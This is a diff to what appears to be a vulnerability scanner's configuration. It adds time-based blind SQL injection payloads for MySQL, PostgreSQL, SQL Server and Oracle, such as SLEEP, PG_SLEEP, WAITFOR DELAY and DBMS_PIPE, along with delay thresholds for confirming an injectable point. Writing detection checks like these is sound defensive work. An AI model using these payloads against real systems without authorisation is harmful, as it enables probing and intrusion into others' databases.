@@ -40,8 +40,31 @@ oracle:
         - "QuerySyntaxException"
         - "NHibernate\\.(?:Hql|QueryException|Exceptions)"
         - "(?:javax|jakarta)\\.persistence\\.\\w*(?:Exception|Query)"
+    # Time-based blind: the error-suppressed case (no DB error, no boolean signal). Each check is confirmed
+    # by the SAME proportional-delay oracle (0 / D / 2D must scale), so adding cross-database and cross-context
+    # payloads only widens coverage — a non-injectable point never scales, so it can never false-positive.
+    # MySQL / MariaDB — parenthesised-numeric and string contexts:
     - type: time_based
       payload: "1) OR SLEEP({{delay}})-- -"
+      delay: 3
+      threshold_ms: 2500
+    - type: time_based
+      payload: "' AND SLEEP({{delay}})-- -"
+      delay: 3
+      threshold_ms: 2500
+    # PostgreSQL — pg_sleep in a string-breakout context:
+    - type: time_based
+      payload: "' AND {{delay}}=(SELECT {{delay}} FROM PG_SLEEP({{delay}}))-- -"
+      delay: 3
+      threshold_ms: 2500
+    # Microsoft SQL Server — WAITFOR DELAY (stacked after a string breakout):
+    - type: time_based
+      payload: "'; WAITFOR DELAY '0:0:{{delay}}'-- -"
+      delay: 3
+      threshold_ms: 2500
+    # Oracle — DBMS_PIPE.RECEIVE_MESSAGE blocks for the timeout when no message arrives:
+    - type: time_based
+      payload: "' AND {{delay}}=DBMS_PIPE.RECEIVE_MESSAGE('a',{{delay}})-- -"
       delay: 3
       threshold_ms: 2500
 confirm_reproducible: true
